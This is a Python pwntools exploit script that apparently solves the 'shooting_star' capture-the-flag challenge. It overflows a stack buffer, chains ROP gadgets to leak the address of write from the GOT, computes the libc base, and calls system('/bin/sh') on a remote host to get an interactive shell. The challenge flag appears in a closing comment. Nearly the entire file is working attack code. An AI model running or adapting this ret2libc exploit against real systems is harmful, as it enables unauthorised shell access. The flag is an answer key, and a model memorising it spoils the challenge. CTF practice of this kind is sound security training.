from pwn import *

def get_offset():
    r = process('./shooting_star')
    pattern = cyclic (0x250)
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil(">> ")
    #gdb.attach(r)
    r.sendline(pattern)
    r.recvline()
    offset = cyclic_find(0x6161617461616173)
    print("offset: ", offset)
    return offset

def main():
    LOCAL = False
    if LOCAL:
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        r = process('./shooting_star')
    else:
        # Found using https://libc.rip/
        libc = ELF('./libc6_2.27-3ubuntu1.4_amd64.so')
        r = remote('209.97.140.29',31588)
    offset = get_offset()
    elf = ELF('./shooting_star')
    print(hex(libc.symbols['write']))

    pop_rdi = p64(0x00000000004012cb)
    pop_rsi_r15 = p64(0x00000000004012c9)
    write_got = p64(elf.got['write'])
    write_plt = p64(elf.plt['write'])
    star_addr = p64(0x00000000004012c9) # star_addr doesn't work but main does; not sure why; there might be some clean up that's done by main before doing anything?
    main_addr = p64(0x0000000000401230)
    print("write got: ", write_got)
    print("write plt: ", write_plt)
    dummy = b'B' * 8
    
    payload = b'A' * offset + pop_rdi + p64(1) + pop_rsi_r15 + write_got + dummy + write_plt + main_addr

    r.recvuntil("> ")
    r.sendline("1")
    #gdb.attach(r)
    r.recvuntil(">> ")
    r.sendline(payload)
    r.recvline()
    r.recvline()
    write_addr = r.recv(8)
    write_addr = int.from_bytes(write_addr, byteorder='little')
    print("Leaked write address: ", hex(write_addr))
    r.recvuntil("> ")

    libc.address = write_addr - libc.symbols['write']
    print(libc.address)
    system = p64(libc.symbols["system"])
    exit_call = p64(libc.symbols["exit"])
    binsh = p64(libc.search(b'/bin/sh').__next__())
    payload = b'A' * offset + pop_rdi + binsh + system 
    r.sendline("1")
    r.recvuntil(">> ")
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
    # Flag: HTB{1_w1sh_pwn_w4s_th1s_e4sy}
